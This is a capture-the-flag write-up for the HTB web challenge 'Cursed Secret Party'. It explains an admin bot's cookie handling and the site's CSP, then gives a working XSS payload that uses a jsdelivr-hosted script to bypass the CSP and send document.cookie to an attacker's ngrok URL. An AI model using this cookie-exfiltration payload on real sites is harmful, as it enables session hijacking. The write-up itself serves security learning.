# Cursed Secret Party
> You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?

## Solution

Looking through the provided source code, we see a `bot.js` file which reads the flag.txt file.
```javascript
const fs = require('fs');
const puppeteer = require('puppeteer');
const JWTHelper = require('./helpers/JWTHelper');
const flag = fs.readFileSync('/flag.txt', 'utf8');
```
The `visit` function opens a browser page and sets a `JWT` token as a cookie. The flag is passed in said token. So we obviously need to steal the bot's cookie to get the flag.

```javascript
const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});
```

After the bot sets the cookie, it visits the `/admin` endpoint, waits 5 seconds, then deletes all the content.
```javascript
		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
```
In the index.js file we notice that we have some definitions set for the CSP.
```javascript
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
```
We noticed this earlier in our Response as well:
```
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'
```
After a little bit of research about CSP and XSS, I found out in the CSP evaluator :
```
cdn.jsdelivr.net is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.
```
We can host an `xss.js` file on a GH repository and add something like alert(1). We can finally trigger the alert, but we need to cookie.

Digging deep enough, i found out this repository: [CSP bypass](https://github.com/CanardMandarin/csp-bypass). It's a simple project that allows the bypass of csp.

we need to create a script tag that point to that repository and  execute a "query" to our ngrok.

Finally we got it:
```javascript
<script src="https://cdn.jsdelivr.net/gh/canardmandarin/csp-bypass@master/dist/sval-classic.js"></script><br csp="window.location='[ngrok url]/?c='.concat(document.cookie)">
```
We got the cookie.
In the `JWTHelper.js` file we see how the JWT token is signed. It uses HS256 with a big random hex string .
```javascript
const APP_SECRET = crypto.randomBytes(69).toString('hex');

module.exports = {
	sign(data) {
		data = Object.assign(data);
		return (jwt.sign(data, APP_SECRET, { algorithm:'HS256' }))
	},
	async verify(token) {
		return (jwt.verify(token, APP_SECRET, { algorithm:'HS256' }));
	}
}
```

Finaly we decoded our token using `jwt.io`.

The flag :
```
HTB{cdn_c4n_byp4ss_c5p!!}
```